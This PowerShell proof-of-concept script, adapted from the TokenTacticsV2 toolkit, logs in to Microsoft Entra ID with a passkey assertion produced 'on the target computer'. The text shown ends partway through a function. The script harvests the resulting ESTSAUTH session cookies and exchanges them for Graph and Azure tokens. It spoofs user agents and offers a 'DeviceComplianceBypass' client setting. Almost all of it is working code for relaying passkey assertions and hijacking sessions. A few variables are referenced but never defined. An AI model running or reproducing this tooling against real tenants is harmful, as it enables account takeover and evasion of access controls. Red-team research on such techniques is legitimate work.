<#
.SYNOPSIS
    Authenticate to Entra ID using a provided Passkey (WebAuthn) assertion.
.DESCRIPTION
    This script is a quick-and-dirty PoC and should not be used in production environments.
.NOTES
    This is a modiefied version of the original script from TokenTactics v2,
    created by Fabian Bader.
    Repository: https://github.com/f-bader/TokenTacticsV2
#>

#requires -Version 5

param(
    [Parameter(Mandatory = $false)]
    [ValidateNotNullOrEmpty()]
    [string] $UserPrincipalName,

    [Parameter(Mandatory = $false)]
    [ValidateNotNullOrEmpty()]
    [string] $InitialUrl = 'https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?response_type=code&redirect_uri=msauth.com.msauth.unsignedapp://auth&scope=https://graph.microsoft.com/.default&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46',

    [Parameter(Mandatory = $false)]
    [ValidateNotNullOrEmpty()]
    [string] $UserAgent = (Get-ForgedUserAgent),

    [Parameter(Mandatory = $false)]
    [ValidateNotNullOrEmpty()]
    [string] $Proxy,

    [Parameter(Mandatory = $false)]
    [ValidateNotNullOrEmpty()]
    [string] $TenantId,

    [Parameter(Mandatory = $false)]
    [ValidateNotNullOrEmpty()]
    [System.Diagnostics.CodeAnalysis.SuppressMessage('PSAvoidUsingPlainTextForPassword','PublicKeyCredential', Justification='PublicKeyCredential is a JSON payload, not a secret')]
    [string] $PublicKeyCredential
)

function Main {
    [CmdletBinding()]
    param ()

    Invoke-EntraIDPasskeyLogin -UserPrincipalName:$script:UserPrincipalName -InitialUrl:$script:InitialUrl -UserAgent:$script:UserAgent -Proxy:$script:Proxy -TenantId:$script:TenantId -PublicKeyCredential:$script:PublicKeyCredential
    Get-EntraIDTokenFromESTSCookie -ESTSCookieType ESTSAUTH -CookieValue $global:ESTSAUTH -Client AzurePowershell
}

function Invoke-EntraIDPasskeyLogin {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string] $UserPrincipalName,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string] $RelyingParty = 'login.microsoft.com',

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string] $InitialUrl = 'https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?response_type=code&redirect_uri=msauth.com.msauth.unsignedapp://auth&scope=https://graph.microsoft.com/.default&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46',

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string] $UserAgent = (Get-ForgedUserAgent),

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string] $Proxy,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string] $TenantId,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [System.Diagnostics.CodeAnalysis.SuppressMessage('PSAvoidUsingPlainTextForPassword','PublicKeyCredential', Justification='PublicKeyCredential is a JSON payload, not a secret')]
        [string] $PublicKeyCredential
    )

    # Configure Default Parameters
    $PSDefaultParameterValues = @{}
    $PSDefaultParameterValues.Add('Invoke-WebRequest:Verbose', $false)

    if ($Proxy) {
        Write-Verbose "$([char]0x2718) Setting proxy to $Proxy"
        $PSDefaultParameterValues.Add('Invoke-WebRequest:Proxy', $Proxy)
    }

    # Configure HTTP Session
    [Microsoft.PowerShell.Commands.WebRequestSession] $session = [Microsoft.PowerShell.Commands.WebRequestSession]::new()
    $session.UserAgent = $UserAgent

    # Make sure System.Web is loaded before working with URLs
    Add-Type -AssemblyName 'System.Web'

    # Optionally replace /organizations/ with $TenantId
    if (-not [string]::IsNullOrEmpty($TenantId)) {
        $tenantIdNormalized = '/{0}/' -f $TenantId.ToLowerInvariant()
        $InitialUrl = $InitialUrl.Replace('/organizations/', $tenantIdNormalized)
    }

    # Add mandatory fields to URI
    # Get all existing query parameters
    try {
        [System.UriBuilder] $uriBuilder = [System.UriBuilder]::new($InitialUrl)
        [System.Collections.Specialized.NameValueCollection] $query = [System.Web.HttpUtility]::ParseQueryString($uriBuilder.Query)
    } catch {
        Write-Error "Invalid auth URL format. $($PSItem.Exception.Message)"
        exit 1
    }

    if ( $InitialUrl -notmatch "^https://login.microsoftonline.com/" ) {
        Write-Error "Auth URL must start with 'https://login.microsoftonline.com/'"
        exit 1
    }

    # Check if required parameters are already present
    [string[]] $requiredParams = @('scope', 'client_id', 'response_type', 'redirect_uri')
    foreach ($param in $requiredParams) {
        if (-not $query.Get($param)) {
            Write-Error "$([char]0x2718) Missing required parameter '$param' in auth URL."
            exit 1
        }
    }

    # Add additional required parameters if missing
    # sso_reload=true
    # login_hint=$UserPrincipalName, if provided
    if (-not $query.Get('sso_reload')) {
        $InitialUrl = "$InitialUrl&sso_reload=true"
    }

    if (-not $query.Get('login_hint') -and -not [string]::IsNullOrEmpty($UserPrincipalName)) {
        $InitialUrl = "$InitialUrl&login_hint=$UserPrincipalName"
    }

    Write-Verbose "$([char]0x2718) Auth URL: $InitialUrl"

    # This sets the initial ESTS cookies and flow state.
    Write-Host "$([char]0x2718) Warming up session on login.microsoftonline.com (Authorize)..." -ForegroundColor Cyan
    try {
        [Microsoft.PowerShell.Commands.BasicHtmlWebResponseObject] $initialResponse = Invoke-WebRequest -UseBasicParsing -Uri $InitialUrl -Method Get -WebSession $session
        $initialResponse.Content -match '{(.*)}' | Out-Null
        [psobject] $sessionInformation = $Matches[0] | ConvertFrom-Json
    } catch {
        # It's expected to redirect or fail if we don't follow the full HTML flow,
        # but we just need the Cookies in $session.
    }

    if (-not $sessionInformation.sFidoChallenge) {
        Write-Error 'No FIDO challenge received from server.'
        exit 1
    }

    [string] $serverChallenge = ConvertTo-Base64Url ([System.Text.Encoding]::ASCII.GetBytes($SessionInformation.sFidoChallenge)) # Base64Url challenge from session info
    Write-Host "$([char]0x2714) Challenge received." -ForegroundColor Green

    Write-Host "$([char]0x2718) Generating FIDO Assertion request paramneters..." -ForegroundColor Cyan

    [string[]] $allowList = $sessionInformation.oGetCredTypeResult.Credentials.FidoParams.AllowList

    if ($null -eq $allowList) {
        # There are no pre-registered passkeys available, so construct a generic command
        Write-Host "PS > Test-Passkey -RelyingParty '$RelyingParty' -Challenge '$serverChallenge'"
    } else {
        # Display a user-specific list of commands
        foreach ($credentialId in $allowList) {
            # Covnert the CredentialId from BASE64 to Base64Url
            [string] $credentialId = ConvertTo-Base64Url ([convert]::FromBase64String($credentialId))
            Write-Host "PS > Test-Passkey -RelyingParty '$RelyingParty' -CredentialId '$credentialId' -Challenge '$serverChallenge'`n"
        }
    }

    Write-Host "$([char]0x25b6) Run one of the commands above on the target computer." -ForegroundColor Yellow

    if ([string]::IsNullOrWhiteSpace($PublicKeyCredential)) {
        $PublicKeyCredential = Read-Host -Prompt "$([char]0x2753) WebAuthnAssertion Response (PublicKeyCredential) JSON"
    }

    [string] $fidoPayload = $null
    try {
        $fidoPayload = ConvertTo-EntraAssertionPayload -PublicKeyCredentialJson $PublicKeyCredential
    } catch {
        Write-Error "Invalid PublicKeyCredential JSON. $($PSItem.Exception.Message)"
        exit 1
    }

    Write-Host "$([char]0x2718) Get required pre-information from microsoft.com..." -ForegroundColor Cyan

    # Example: https://login.microsoft.com/common/fido/get?uiflavor=Web
    [string] $verifyUrl = $sessionInformation.urlFidoLogin

    # The fidoAssertion must be a JSON string *inside* the body
    $bodyVerify = @{
        allowedIdentities = 2
        canary            = $sessionInformation.sFT
        ServerChallenge   = $sessionInformation.sFT
        postBackUrl       = $sessionInformation.urlPost
        postBackUrlAad    = $sessionInformation.urlPostAad
        postBackUrlMsa    = $sessionInformation.urlPostMsa
        cancelUrl         = $sessionInformation.urlRefresh
        resumeUrl         = $sessionInformation.urlResume
        correlationId     = $sessionInformation.correlationId
        credentialsJson   = $credentialsJson
        ctx               = $sessionInformation.sCtx
        username          = $UserPrincipalName
        loginCanary       = $sessionInformation.canary
    }

    try {
        Write-Verbose "$([char]0x2718) Submitting verification request ..."
        Write-Debug "$($bodyVerify | ConvertTo-Json -Depth 10)"
        [Microsoft.PowerShell.Commands.BasicHtmlWebResponseObject] $respVerify = Invoke-WebRequest -UseBasicParsing -Uri $verifyUrl -Method Post -Body $bodyVerify -WebSession $session

        # Extract config from response headers/cookies
        $respVerify.Content -match '{(.*)}' | Out-Null
        [psobject] $responseInformation = $Matches[0] | ConvertFrom-Json
    } catch {
        Write-Warning "Verification request failed: $($_.Exception.Message)"
        exit 1
    }

    [string] $loginUri = "https://login.microsoftonline.com/common/login"
    [hashtable] $payload = @{
        type         = 23
        ps           = 23
        assertion    = $fidoPayload
        lmcCanary    = $ResponseInformation.sCrossDomainCanary
        hpgrequestid = $ResponseInformation.sessionId
        ctx          = $ResponseInformation.sCtx
        canary       = $ResponseInformation.canary
        flowToken    = $ResponseInformation.sFT
    }

    try {
        Write-Host "$([char]0x2718) Submitting FIDO2 assertion to microsoftonline.com ..." -ForegroundColor Cyan
        Write-Debug ($payload | ConvertTo-Json -Depth 10)
        $respFinalize = Invoke-WebRequest -UseBasicParsing -Uri $loginUri -Method Post -Body $payload -WebSession $session -MaximumRedirection 0 -ErrorAction SilentlyContinue # -SkipHttpErrorCheck
        $respFinalize.Content -match '{(.*)}' | Out-Null
        [string] $debug = $Matches[0] | ConvertFrom-Json | ConvertTo-Json -Depth 10
        Write-Debug "$([char]0x2718) Finalization Response: $debug"
    } catch {
        Write-Warning "Finalization request failed; checking previous response for success. Error: $($_.Exception.Message)"
        Write-Debug "$([char]0x2718) Last Response: $($respFinalize | ConvertTo-Json -Depth 10 )"
        exit 1
    }

    $loginUri = "https://login.microsoftonline.com/common/login?sso_reload=true"
    # Reuse the verified finalize payload and only replace the reload-specific flow token.
    $payload['flowToken'] = $SessionInformation.oGetCredTypeResult.FlowToken

    try {
        Write-Host "$([char]0x2718) Submitting FIDO2 assertion to microsoftonline.com with sso_reload=true ..." -ForegroundColor Cyan
        $respFinalize = Invoke-WebRequest -UseBasicParsing -Uri $LoginUri -Method Post -Body $Payload -WebSession $session -MaximumRedirection 0 -ErrorAction SilentlyContinue # -SkipHttpErrorCheck
    } catch {
        Write-Warning "Finalization request failed; checking previous response for success. Error: $($_.Exception.Message)"
        Write-Debug "$([char]0x2718) Last Response: $($respFinalize)"
        exit 1
    }

    $respFinalize.Content -match '{(.*)}' | Out-Null
    [psobject] $debug = $Matches[0] | ConvertFrom-Json
    if ($debug.pgid) {
        Write-Host "$([char]0x2718) PageID: $($debug.pgid)"
        $CurrentPageId = $debug.pgid
    }
    Write-Debug "$([char]0x2718) Finalization Response: $($debug | ConvertTo-Json -Depth 10)"

    # Interrupt Handling
    [int] $loopCount = 0
    while ($debug.pgid -in @("CmsiInterrupt", "KmsiInterrupt", "ConvergedSignIn")) {
        # Cleanup variables
        Remove-Variable -Name respFinalize -ErrorAction SilentlyContinue
        # Prevent infinite loops
        if ($CurrentPageId -eq $LastPageId) {
            Write-Warning "Stuck in interrupt loop on PageID: $($debug.pgid). Exiting."
            break
        }
        $LastPageId = $CurrentPageId

        # Display debug info only on first loop
        if ($LoopCount -eq 0) {
            if ( -not [string]::IsNullOrWhiteSpace($debug.sDeviceId)) {
                Write-Host "$([char]0x2718)  Device Id: $($debug.sDeviceId)"
            }
            if ( -not [string]::IsNullOrWhiteSpace($debug.correlationId)) {
                Write-Host "$([char]0x2718)  Correlation Id: $($debug.correlationId)"
            }
            if ( -not [string]::IsNullOrWhiteSpace($Debug.sessionId)) {
                Write-Host "$([char]0x2718)  Session Id: $($debug.sessionId)"
            }
            if ( -not [string]::IsNullOrWhiteSpace($Debug.sPOST_Username)) {
                Write-Host "$([char]0x2718)  Username: $($debug.sPOST_Username)"
            }
        }
        $LoopCount++

        if ($LoopCount -gt 10) {
            Write-Warning "Exceeded maximum interrupt handling attempts. Exiting."
            break
        }

        # CMSI (consent) interrupt
        if ($debug.pgid -eq "CmsiInterrupt") {
            Write-Host "$([char]0x2718)  AADSTS50199: CmsiInterrupt"
            Write-Host "   For security reasons, user confirmation is required for this application: $($debug.sAppName)."
            Write-Host "$([char]0x2718)  urlPost URL: $($debug.urlPost)"
            $Uri = "https://login.microsoftonline.com/appverify"
            $Payload = @{
                "ContinueAuth"    = "true"
                "i19"             = "$(Get-Random -Minimum 1000 -Maximum 9999)"
                "canary"          = $debug.canary
                "iscsrfspeedbump" = "false"
                "flowToken"       = $Debug.sFT
                "hpgrequestid"    = $Debug.correlationId
                "ctx"             = $Debug.sCtx
            }

            try {
                Write-Host "$([char]0x2718) Submitting CMSI response to microsoftonline.com ..." -ForegroundColor Cyan
                $respFinalize = Invoke-WebRequest -UseBasicParsing -Uri $Uri -Method Post -Body $Payload -WebSession $session -MaximumRedirection 10 # -SkipHttpErrorCheck
            } catch {
                Write-Warning "CMSI request failed; checking previous response for success. Error: $($_.Exception.Message)"
            }
        }

        # KMSI (keep me signed in) interrupt
        if ($Debug.pgid -eq "KmsiInterrupt") {
            Write-Host "$([char]0x2718) Handling KMSI prompt..." -ForegroundColor Cyan
            $PayloadKMSI = @{
                LoginOptions = 1
                type         = 28
                ctx          = $Debug.sCtx
                hpgrequestid = $Debug.correlationId
                flowToken    = $Debug.sFT
                canary       = $Debug.canary
                i19          = 4130
            }

            try {
                $Uri = "https://login.microsoftonline.com/kmsi"
                Write-Host "$([char]0x2718) Submitting KMSI response to microsoftonline.com ..." -ForegroundColor Cyan
                $respFinalize = Invoke-WebRequest -UseBasicParsing -Uri $Uri -Method Post -Body $PayloadKMSI -WebSession $session
                Write-Debug "$([char]0x2718) KMSI Response: $($respFinalize | Out-String )"
            } catch {
                Write-Warning "KMSI request failed; checking previous response for success. Error: $($_.Exception.Message)"
            }
        }

        # ConvergedSignIn interrupt
        if ($Debug.pgid -eq "ConvergedSignIn") {
            Write-Output "$([char]0x2718)  ConvergedSignIn - Attempting to continue sign-in flow"
            [string] $sessionId = $($Debug.arrSessions[0].id)
            if ($null -eq $sessionId)
            {
                $sessionId = $Debug.sessionId
            }
            try {
                $Uri = $Debug.urlLogin + "&sessionid=$($sessionId)"
                Write-Host "$([char]0x2718) Submitting ConvergedSignIn request to microsoftonline.com ..." -ForegroundColor Cyan
                Write-Verbose "$([char]0x2718) ConvergedSignIn URL: $Uri"
                $respFinalize = Invoke-WebRequest -UseBasicParsing -Uri $Uri -Method Get -WebSession $session
            } catch {
                Write-Warning "ConvergedSignIn request failed; checking previous response for success. Error: $($_.Exception.Message)"
            }
        }

        Remove-Variable -Name Debug -ErrorAction SilentlyContinue
        if ( $respFinalize.Content -match '{(.*)}' ) {
            try {
                [psobject] $debug = $Matches[0] | ConvertFrom-Json
            } catch {
                Write-Warning "Failed to parse JSON response during interrupt handling. Exiting loop."
                break
            }
            if ($Debug.pgid) {
                Write-Host "$([char]0x2718) PageID: $($Debug.pgid)"
                $CurrentPageId = $Debug.pgid
            }
            Write-Debug "$([char]0x2718) Full Response: $($Debug | ConvertTo-Json -Depth 10)"
        } else {
            Write-Debug "$([char]0x2718) No JSON response received; exiting interrupt handling loop."
            Write-Debug "$([char]0x2718) Last Response: $($respFinalize) ..."
            break
        }
    }

    if ($respFinalize.Error) {
        Write-Error "Login Error: $($respFinalize.Error.Message)"
    } elseif ( $session.Cookies.GetCookies("https://login.microsoftonline.com") | Where-Object Name -Like "ESTS*") {
        Write-Host "$([char]0x2714) Login Successful!" -ForegroundColor Green
        $ESTSAUTH = $session.Cookies.GetCookies("https://login.microsoftonline.com") | Where-Object Name -EQ "ESTSAUTH"
        $ESTSAUTHPERSISTENT = $session.Cookies.GetCookies("https://login.microsoftonline.com") | Where-Object Name -EQ "ESTSAUTHPERSISTENT"
        $ESTSAUTHLIGHT = $session.Cookies.GetCookies("https://login.microsoftonline.com") | Where-Object Name -EQ "ESTSAUTHLIGHT"
        # Get  ESTS cookie with longest value (usually ESTSAUTH or ESTSAUTHPERSISTENT)
        $ests = @($ESTSAUTH, $ESTSAUTHPERSISTENT, $ESTSAUTHLIGHT) | Sort-Object { $_.Value.Length } -Descending | Select-Object -First 1
        if ($ests) {
            Write-Host "$([char]0x26BF) ESTSAUTH Cookie: $($ests.Value.Substring(0, 20))... saved as `$global:ESTSAUTH" -ForegroundColor Gray
            $global:ESTSAUTH = $ests.Value
            Write-Host "$([char]0x26BF) Session saved as `$global:webSession for reuse in other functions." -ForegroundColor Gray
            $global:webSession = $session
        }
        try {
            $OneFinalResponse = Invoke-WebRequest -UseBasicParsing -Uri $InitialUrl -Method Get -WebSession $session -MaximumRedirection 0 -ErrorVariable RedirectError
            Write-Debug "$([char]0x2718) Last response: $($OneFinalResponse)"
            if ($RedirectError) {
                $RedirectUri = $RedirectError[0].InnerException.Response.Headers.Location
            }
        } catch {
            $RedirectUri = $_.Exception.Response.Headers.Location
        }
        if ($RedirectUri) {
            Write-Verbose "$([char]0x2714) Authorization Code Flow completed. Redirect URI: $RedirectUri"
        }
    } else {
        Write-Warning "Flow finished but success state is unclear. Saved session for inspection as `$global:webSession."
        $respFinalize.Content -match '{(.*)}' | Out-Null
        $Matches[0] | ConvertFrom-Json | ConvertTo-Json -Depth 10
        $global:webSession = $session
    }
}


<#
.SYNOPSIS
    Converts a byte array to a Base64Url encoded string.

.DESCRIPTION
    This function takes a byte array as input and returns its Base64Url encoded representation.
    Base64Url encoding is similar to standard Base64 encoding but replaces '+' with '-', '/' with '_',
    and removes padding '=' characters, making it safe for URL transmission.

.PARAMETER Bytes
    A byte array to be converted to Base64Url format.

.EXAMPLE
    $byteArray = [byte[]](0..255)
    $base64UrlString = ConvertTo-Base64Url -Bytes $byteArray
    Write-Output $base64UrlString

.NOTES
    Part of TokenTacticsV2
    https://github.com/f-bader/TokenTacticsV2
#>
function ConvertTo-Base64Url {
    param([byte[]]$Bytes)
    return [Convert]::ToBase64String($Bytes).Replace('+', '-').Replace('/', '_').TrimEnd('=')
}

function Get-EntraIDTokenFromESTSCookie {

    <#
    .DESCRIPTION
        Authenticate to an application (default graph.microsoft.com) using Authorization Code flow using an ESTS cookie for authentication.

    .EXAMPLE
        Get-EntraIDTokenFromESTSCookie -Client MSTeams -ESTSAuthCookie "0.AbcAp.."

    .AUTHOR
        Fabian Bader
    #>

    [CmdletBinding()]
    param(
        [Alias("ESTSAuthCookie")]
        [Parameter(Mandatory = $True)]
        [string]$CookieValue,
        [ValidateSet("ESTSAUTHPERSISTENT", "ESTSAUTH")]
        $ESTSCookieType = "ESTSAUTHPERSISTENT",
        [Parameter(Mandatory = $False)]
        [ValidateSet("MSTeams", "MSEdge", "AzurePowershell", "AzureManagement", "DeviceComplianceBypass", "Custom")]
        [string]$Client = "MSTeams",
        [Parameter(Mandatory = $False)]
        [string]$CustomUserAgent,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'AndroidMobile', 'iPhone')]
        [string]$Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [string]$Browser,
        [Parameter(Mandatory = $False)]
        [string]$ClientID,
        [Parameter(Mandatory = $False)]
        [string]$Resource = "https://graph.microsoft.com",
        [Parameter(Mandatory = $False)]
        [string]$Scope = "openid offline_access",
        [Parameter(Mandatory = $False)]
        [string]$RedirectUrl = "https://login.microsoftonline.com/common/oauth2/nativeclient",
        [Parameter(Mandatory = $false)]
        [string]$Proxy
    )

    if ($Client -eq "MSTeams") {
        $ClientID = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
    } elseif ($Client -eq "MSEdge") {
        $ClientID = "ecd6b820-32c2-49b6-98a6-444530e5a77a"
    } elseif ($Client -eq "AzurePowershell") {
        $ClientID = "1950a258-227b-4e31-a9cf-717495945fc2"
    } elseif ($Client -eq "DeviceComplianceBypass") {
        $ClientID = "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223"
        $RedirectUrl = "msauth://com.microsoft.windowsintune.companyportal/1L4Z9FJCgn5c0VLhyAxC5O9LdlE="
    } elseif ($Client -eq "AzureManagement") {
        $ClientID = "84070985-06ea-473d-82fe-eb82b4011c9d"
    } elseif ($Client -eq "Custom") {
        if ([string]::IsNullOrWhiteSpace($ClientID)) {
            Write-Error "ClientID must be provided for Custom client"
            return
        }
        if ([string]::IsNullOrWhiteSpace($Scope)) {
            Write-Error "Scope must be provided for Custom client"
            return
        }
    }

    $Parameters = @{
        "CookieType"  = $ESTSCookieType
        "CookieValue" = $CookieValue
        "ClientID"    = $ClientID
        "Scope"       = $Scope
        "RedirectUrl" = $RedirectUrl
        "Verbose"     = $VerbosePreference
    }
    if ($Proxy) {
        $Parameters.Add("Proxy", $Proxy)
    }
    if ($CustomUserAgent) {
        $Parameters.Add("CustomUserAgent", $CustomUserAgent)
    } elseif ($Device) {
        if ($Browser) {
            $Parameters.Add("CustomUserAgent", (Get-ForgedUserAgent -Device $Device -Browser $Browser))
        } else {
            $Parameters.Add("CustomUserAgent", (Get-ForgedUserAgent -Device $Device))
        }
    } elseif ($Browser) {
        $Parameters.Add("CustomUserAgent", (Get-ForgedUserAgent -Browser $Browser))
    } else {
        $Parameters.Add("CustomUserAgent", (Get-ForgedUserAgent))
    }
    if ($Device) {
        $Parameters.Add("Device", $Device)
    }
    if ($Browser) {
        $Parameters.Add("Browser", $Browser)
    }
    if ($Resource) {
        $Parameters.Add("Resource", $Resource)
    }
    Get-EntraIDTokenFromCookie @Parameters
}

function Get-EntraIDTokenFromCookie {

    <#
    .DESCRIPTION
        Authenticate to an application (default graph.microsoft.com) using Authorization Code flow and a cookie
        Authenticates to MSGraph as Teams FOCI client by default.
        https://learn.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-auth-code-flow

    .EXAMPLE
        Get-EntraIDTokenFromCookie -CookieType ESTSAUTHPERSISTENT -CookieValue "0.AbcAp.."

    .AUTHOR
        Adapted for PowerShell by https://github.com/rotarydrone from ROADtools by https://github.com/dirkjanm
        https://github.com/rvrsh3ll/TokenTactics/pull/9
        https://github.com/dirkjanm/ROADtools/wiki/ROADtools-Token-eXchange-(roadtx)#selenium-based-authentication

        Extended to support appverify endpoint, multiple cookie formats and full error handling by Fabian Bader
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]$CookieType,
        [Parameter(Mandatory = $True)]
        [string]$CookieValue,
        [Parameter(Mandatory = $False)]
        [string]$CustomUserAgent,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'AndroidMobile', 'iPhone')]
        [string]$Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [string]$Browser,
        [Parameter(Mandatory = $true)]
        [string]$ClientID = "1fec8e78-bce4-4aaf-ab1b-5451cc387264", # Microsoft Teams
        [Parameter(Mandatory = $False)]
        [string]$Resource = "https://graph.microsoft.com",
        [Parameter(Mandatory = $true)]
        [string]$Scope = "openid offline_access",
        [Parameter(Mandatory = $true)]
        [string]$RedirectUrl,
        [Parameter(Mandatory = $false)]
        [switch]$UseCodeVerifier,
        [Parameter(Mandatory = $false)]
        [switch]$UseV1Endpoint,
        [Parameter(Mandatory = $false)]
        [string]$Proxy
    )

    # Configure Default Parameters
    $PSDefaultParameterValues = @{}
    $PSDefaultParameterValues.Add('Invoke-WebRequest:Verbose', $false)

    if ($Proxy) {
        Write-Verbose "$([char]0x2718) Setting proxy to $Proxy"
        $PSDefaultParameterValues.Add('Invoke-WebRequest:Proxy', $Proxy)
    }

    if ($CustomUserAgent) {
        $UserAgent = $CustomUserAgent
    } elseif ($Device) {
        if ($Browser) {
            $UserAgent = Get-ForgedUserAgent -Device $Device -Browser $Browser
        } else {
            $UserAgent = Get-ForgedUserAgent -Device $Device
        }
    } elseif ($Browser) {
        $UserAgent = Get-ForgedUserAgent -Browser $Browser
    } else {
        $UserAgent = Get-ForgedUserAgent
    }

    Write-Verbose "ClientID: $ClientID"
    if ($Resource) {
        Write-Verbose "Resource: $Resource"
    }
    Write-Verbose "Scope: $Scope"
    Write-Verbose "RedirectUrl: $RedirectUrl"
    Write-Verbose "CookieType: $CookieType"
    Write-Verbose "UserAgent: $UserAgent"

    $Headers = @{}
    $Headers["User-Agent"] = $UserAgent

    $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
    $session.UserAgent = $UserAgent
    # Add basic cookies to the session
    $null = Invoke-WebRequest -UseBasicParsing -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Get -Uri "https://login.microsoftonline.com/error"
    $cookie = [System.Net.Cookie]::new($CookieType, $CookieValue)
    $session.Cookies.Add('https://login.microsoftonline.com/', $cookie)
    $SessionCookies = $session.Cookies.GetCookies('https://login.microsoftonline.com') | Select-Object -ExpandProperty Name
    Write-Verbose "Session cookies: $( $SessionCookies -join ', ' )"

    $state = [System.Guid]::NewGuid().ToString()
    $redirect_uri = ([System.Uri]::EscapeDataString($RedirectUrl))

    # Get the authorization code from the STS
    if ($UseV1Endpoint) {
        $Uri = "https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=$($ClientID)&resource=$($Resource)&scope=$($Scope)&redirect_uri=$($redirect_uri)&state=$($state)"
    } else {
        $Uri = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?response_type=code&client_id=$($ClientID)&scope=$($Scope)&redirect_uri=$($redirect_uri)&state=$($state)"
    }
    if ($UseCodeVerifier) {
        $CodeVerifier = Get-TTCodeVerifier
        $CodeChallenge = Get-TTCodeChallenge -CodeVerifier $CodeVerifier
        $Uri += "&code_challenge=$CodeChallenge&code_challenge_method=S256"
    }
    if ($UseCAE -and ( $UseV1Endpoint -eq $false )) {
        # Add 'cp1' as client claim to get a access token valid for 24 hours
        $Uri += "&claims=" + ( @{"access_token" = @{ "xms_cc" = @{ "values" = @("cp1") } } } | ConvertTo-Json -Compress -Depth 99 )
    }
    Write-Verbose "Requesting URL: $Uri"
    Write-Output "$([char]0x2718)  Calling authorization endpoint with $CookieType cookie"
    if ($PSVersionTable.PSEdition -ne "Core") {
        $sts_response = Invoke-WebRequest -UseBasicParsing -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Get -Uri $Uri -Headers $Headers
    } else {
        $sts_response = Invoke-WebRequest -UseBasicParsing -SkipHttpErrorCheck -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Get -Uri $Uri -Headers $Headers
    }

    Write-Verbose "Status code: $($sts_response.StatusCode)"
    if ( $sts_response.StatusCode -eq 200 -and $sts_response.RawContent -match "\`$Config=(.*);" ) {
        Write-Verbose "AppConfig found in initial response"
        $AppConfig = $Matches[1] | ConvertFrom-Json
        Write-Debug "AppConfig: $($AppConfig | ConvertTo-Json -Depth 99)"

        # Handle ConvergedSignIn flow
        if ($AppConfig.pgid -eq "ConvergedSignIn") {
            Write-Output "$([char]0x2718)  ConvergedSignIn - Attempting to continue sign-in flow"
            $Uri = $AppConfig.urlLogin + "&sessionid=$($AppConfig.arrSessions[0].id)"
            if ($PSVersionTable.PSEdition -ne "Core") {
                $sts_response = Invoke-WebRequest -UseBasicParsing -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Get -Uri $Uri -Headers $Headers
            } else {
                $sts_response = Invoke-WebRequest -UseBasicParsing -SkipHttpErrorCheck -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Get -Uri $Uri -Headers $Headers
            }
            Remove-Variable -Name AppConfig -ErrorAction SilentlyContinue
        }

        if ($sts_response.RawContent -match "\`$Config=(.*);") {
            Write-Verbose "AppConfig found in initial response"
            $AppConfig = $Matches[1] | ConvertFrom-Json
            Write-Debug "AppConfig: $($AppConfig | ConvertTo-Json -Depth 99)"
        }

        #region error handling
        if ( -not [string]::IsNullOrWhiteSpace( $AppConfig.sErrorCode ) ) {
            Invoke-EntraErrorHandling -AppConfig $AppConfig
            return
        }
        #endregion

        #region CmsiInterrupt - For security reasons, user confirmation is required for this request. Interrupt is shown for all scheme redirects in mobile browsers.
        if ( $AppConfig.pgid -eq "CmsiInterrupt" ) {
            Write-Output "$([char]0x2718)  AADSTS50199: CmsiInterrupt"
            Write-Output "   For security reasons, user confirmation is required for this application: $($AppConfig.sAppName)."
            Write-Output "$([char]0x2718)  urlPost URL: $($AppConfig.urlPost)"
            if ( -not [string]::IsNullOrWhiteSpace($AppConfig.sDeviceId)) {
                Write-Output "$([char]0x2718)  Device Id: $($AppConfig.sDeviceId)"
            }
            if ( -not [string]::IsNullOrWhiteSpace($AppConfig.correlationId)) {
                Write-Output "$([char]0x2718)  Correlation Id: $($AppConfig.correlationId)"
            }
            if ( -not [string]::IsNullOrWhiteSpace($AppConfig.sessionId)) {
                Write-Output "$([char]0x2718)  Session Id: $($AppConfig.sessionId)"
            }
            if ( -not [string]::IsNullOrWhiteSpace($AppConfig.sPOST_Username)) {
                Write-Output "$([char]0x2718)  Username: $($AppConfig.sPOST_Username)"
            }
            $Uri = "https://login.microsoftonline.com/appverify"
            $Body = @{
                "ContinueAuth"    = "true"
                "i19"             = "$(Get-Random -Minimum 1000 -Maximum 9999)"
                "canary"          = $AppConfig.canary
                "iscsrfspeedbump" = "false"
                "flowToken"       = $AppConfig.sFT
                "hpgrequestid"    = $sts_response.Headers['x-ms-request-id']
                "ctx"             = $AppConfig.sCtx
            }
            if ($PSVersionTable.PSEdition -ne "Core") {
                $sts_response = Invoke-WebRequest -UseBasicParsing -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Post -Uri $Uri -Headers $Headers -Body $Body
            } else {
                $sts_response = Invoke-WebRequest -UseBasicParsing -SkipHttpErrorCheck -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Post -Uri $Uri -Headers $Headers -Body $Body
            }
        }
        #endregion
